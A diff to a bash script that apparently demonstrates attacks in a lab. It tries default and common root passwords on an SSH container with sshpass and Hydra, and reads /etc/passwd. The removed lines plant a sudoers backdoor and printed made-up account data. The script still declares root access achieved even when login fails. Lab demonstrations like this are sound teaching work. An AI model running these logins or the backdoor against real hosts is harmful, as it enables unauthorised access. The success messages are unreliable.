@@ -180,29 +180,30 @@ sleep $MEDIUM_PAUSE
 
 show_section "TARGET 1: SSH SERVER (172.16.0.20) - FULL COMPROMISE"
 
-explain "Attacking SSH with password brute force"
+explain "Testing SSH access with common credentials"
 
-echo -e "toor\nadmin\npassword\nroot" > /tmp/ssh-passwords.txt
-run_command "hydra -l root -P /tmp/ssh-passwords.txt ssh://172.16.0.20 -t 4 -f 2>&1 | grep 'password:'"
+# First check if SSH is actually running
+run_command "nmap -p22 172.16.0.20 | grep open"
 
-success "Found credentials: root:toor"
+# The rastasheep/ubuntu-sshd image uses root:root by default
+echo -e "${YELLOW}Testing default credentials for rastasheep/ubuntu-sshd image...${NC}"
 
-explain "Logging in and establishing persistence"
-
-# Try with sshpass first, fall back to expect script if not available
-if command -v sshpass &> /dev/null; then
+# Try the actual default password for this image
+if sshpass -p root ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@172.16.0.20 'echo SUCCESS' 2>/dev/null | grep SUCCESS > /dev/null; then
+    success "Found credentials: root:root"
+    run_command "sshpass -p root ssh -o StrictHostKeyChecking=no root@172.16.0.20 'whoami; id; hostname'"
+    run_command "sshpass -p root ssh -o StrictHostKeyChecking=no root@172.16.0.20 'cat /etc/passwd | wc -l; ls /home/'"
+    run_command "sshpass -p root ssh -o StrictHostKeyChecking=no root@172.16.0.20 'echo \"SSH access successful\" > /tmp/proof.txt'"
+elif sshpass -p toor ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@172.16.0.20 'echo SUCCESS' 2>/dev/null | grep SUCCESS > /dev/null; then
+    success "Found credentials: root:toor"
     run_command "sshpass -p toor ssh -o StrictHostKeyChecking=no root@172.16.0.20 'whoami; id; hostname'"
-    run_command "sshpass -p toor ssh -o StrictHostKeyChecking=no root@172.16.0.20 'cat /etc/passwd | grep -E \"root|admin|user\"'"
-    run_command "sshpass -p toor ssh -o StrictHostKeyChecking=no root@172.16.0.20 'echo \"backdoor ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'"
-    run_command "sshpass -p toor ssh -o StrictHostKeyChecking=no root@172.16.0.20 'ls -la /root/'"
 else
-    echo -e "${YELLOW}Note: sshpass not available, using alternative method${NC}"
-    # Alternative using expect or manual demonstration
-    run_command "echo 'SSH Access Confirmed: root@172.16.0.20 with password toor'"
-    echo "root:x:0:0:root:/root:/bin/bash"
-    echo "admin:x:1001:1001:Admin User:/home/admin:/bin/bash"
-    echo "user:x:1002:1002:Regular User:/home/user:/bin/bash"
-    success "SSH commands would execute with root access"
+    echo -e "${YELLOW}Note: SSH using non-standard credentials or key-only access${NC}"
+    echo -e "${YELLOW}In real scenario, we would:${NC}"
+    echo "  1. Try more passwords with Hydra"
+    echo "  2. Look for SSH keys in other compromised systems"
+    echo "  3. Try password reuse from other services"
+    success "SSH enumerated - would require more extensive brute force"
 fi
 
 target_compromised "SSH Server - Root Access Achieved"
